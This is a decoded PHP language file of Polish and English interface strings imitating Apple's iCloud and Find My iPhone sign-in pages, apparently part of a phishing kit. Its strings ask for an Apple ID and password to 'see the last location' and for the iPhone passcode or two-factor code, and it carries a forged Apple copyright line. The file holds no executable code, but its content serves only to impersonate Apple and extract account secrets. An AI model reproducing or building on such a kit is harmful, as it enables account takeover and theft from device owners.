<?php
/*
 * @ PHP 5.6
 * @ Decoder version : 1.0.0.1
 * @ Release on : 24.03.2018
 * @ Website    : http://EasyToYou.eu
 */

$lang = array();
$lang["PAGE_TITLE"] = "iCloud";
$lang["SETUP_INSTRUCTIONS"] = "Instrukcje instalowania";
$lang["MOB_locating"] = "Locating...";
$lang["ALERT1"] = "Authentication Required";
$lang["ALERT2"] = "Enter your Apple ID & password";
$lang["ALERT3"] = "to see the last location.";
$lang["ALERT4"] = "Your Apple ID or password was incorrect.";
$lang["HELP"] = "Help";
$lang["VERIFY"] = "Verify your identity.";
$lang["PROTECTED"] = "Your Apple ID is protected with two-factor authentication.";
$lang["CODESHOWN"] = " Enter the Passcode of your iPhone or verification code shown on your other devices.";
$lang["VERIFYING"] = "Verifying...";
$lang["SIGN_IN_TITLE"] = "Zaloguj się do iCloud";
$lang["INCORRECT_ID"] = "Apple ID lub hasło jest nieprawidłowe.";
$lang["APPLE_ID"] = "apple ID";
$lang["PASSWORD"] = "hasło";
$lang["KEEP_ME"] = "Pamiętaj mnie";
$lang["FORGOT_ID"] = "Nie pamiętasz Apple ID lub hasła?";
$lang["DONT_HAVE_ID"] = "Nie bądź Apple ID?";
$lang["CREATE_YOURS"] = "Utwórz swoje teraz.";
$lang["Create_Footer"] = "Stworzyć Apple ID";
$lang["CHECK_ACTIVATION"] = "Sprawdź status aktywacji blokady";
$lang["SYSTEM_STATUS"] = "Stan systemu";
$lang["POLICY"] = "Polityka prywatności";
$lang["TERMS"] = "Zasady i warunki";
$lang["COPYRIGHT"] = "Copyright © 2020 Apple Inc. Wszelkie prawa zastrzeżone.";
$lang["MOB_PAGE_TITLE"] = "iCloud";
$lang["MOB_FIND"] = "Find My iPhone";
$lang["MOB_APPLE_ID"] = "apple ID";
$lang["MOB_EXAMPLE"] = "example@icloud.com";
$lang["MOB_PASSWORD"] = "hasło";
$lang["MOB_REQUIRED"] = "wymagany";
$lang["MOB_LOGIN"] = "Zaloguj się ...";
$lang["MOB_FORGOT_ID"] = "Zapomniałeś Apple ID lub hasła?";
$lang["MOB_SETUP_INSTRUCTIONS"] = "Instrukcje instalowania";
$lang["MOB_locating"] = "Lokalizowanie ...";
$lang["REMINDERS"] = "przypomnienia";
$lang["NOTES"] = "Uwagi";
$lang["ICLOUD_DRIVE"] = "iCloud Napęd";
$lang["PHOTOS"] = "Zdjęcia";
$lang["CONTACTS"] = "Łączność";
$lang["MAIL"] = "Poczta";
$lang["SETTINGS"] = "Ustawienia";
$lang["FIND_MY_IPHONE"] = "Znajdź mojego IPhone a";
$lang["KEYNOTE"] = "Myśl przewodnia";
$lang["NUMBERS"] = "takty muzyczne";
$lang["FIND_FRIENDS"] = "Znajdź przyjaciół";
$lang["PAGES"] = "strony";
$lang["ALL_DEVICES"] = "Wszystkie urządzenia";
$lang["ICLOUD_SETTINGS"] = "Ustawienia iCloud";
$lang["SIGN_OUT"] = "Wyloguj się";
$lang["LOCATE"] = "Lokowanie...";
$lang["WELCOME"] = "Witamy w";
$lang["IMPROVE"] = "Zwiększ szanse na znalezienie iDevices, nawet jeśli nie są one połączone z Internetem.";
$lang["MOMENT"] = "Lokalizacja zgubionego iPhone'a może potrwać kilka minut.";
$lang["ALL_DEVICES_OFFLINE"] = "Wszystkie urządzenia Offline";
$lang["NO_LOCO"] = "Brak lokalizacje mogą być wyświetlane, ponieważ wszystkie urządzenia są w trybie offline.";

?>